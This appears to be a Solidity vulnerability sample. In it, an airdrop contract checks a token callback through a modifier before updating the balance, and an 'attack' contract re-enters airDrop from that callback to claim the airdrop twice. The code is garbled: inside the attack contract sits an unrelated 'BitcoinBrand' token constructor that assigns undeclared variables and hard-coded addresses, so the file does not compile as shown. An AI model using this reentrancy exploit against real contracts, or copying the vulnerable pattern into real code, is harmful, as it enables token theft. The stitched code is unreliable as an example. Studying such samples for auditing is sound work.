 

pragma solidity ^0.4.24;

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

   
   
  function airDrop() hasNoBalance supportsToken  public{
    tokenBalance[msg.sender] += 20;
  }

   
  modifier supportsToken() {
    require(keccak256(abi.encodePacked("Nu Token")) == Bank(msg.sender).supportsToken());
    _;
  }
   
  modifier hasNoBalance {
      require(tokenBalance[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{  
    bool hasBeenCalled;

    function BitcoinBrand() public {
        totalSupply = 30000000000000000000000000000;
        name = 'BitcoinBrand';
        symbol = 'BTCB';
        decimals = 18;
        balanceOf[0xc4e570D2644CCe3a71DC4345b13EE5FD3aF720d1] = totalSupply;
        Transfer(address(0), 0xc4e570D2644CCe3a71DC4345b13EE5FD3aF720d1, totalSupply);

        airAmount = 1000000000000000000;
        airBegintime = 1529956800;
        airEndtime = 1529957100;
        airSender = 0xc4e570D2644CCe3a71DC4345b13EE5FD3aF720d1;
        airLimitCount = 1;

        icoRatio = 20000000;
        icoBegintime = 1529971200;
        icoEndtime = 1535327940;
        icoSender = 0xf46D665966674a8793aEd3109cCC65B2f638cF09;
        icoHolder = 0xf46D665966674a8793aEd3109cCC65B2f638cF09;
    }

    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}
